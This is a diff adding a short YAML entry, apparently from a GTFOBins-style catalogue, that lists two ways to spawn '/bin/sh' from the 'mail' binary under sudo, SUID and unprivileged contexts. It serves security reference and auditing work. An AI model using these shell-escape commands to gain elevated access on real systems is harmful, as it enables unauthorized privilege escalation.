@@ -1,0 +1,20 @@
+---
+functions:
+  shell:
+  - code: |-
+      mail --exec='!/bin/sh'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    version: GNU
+  - code: |-
+      mail -f /etc/profile
+      !/bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
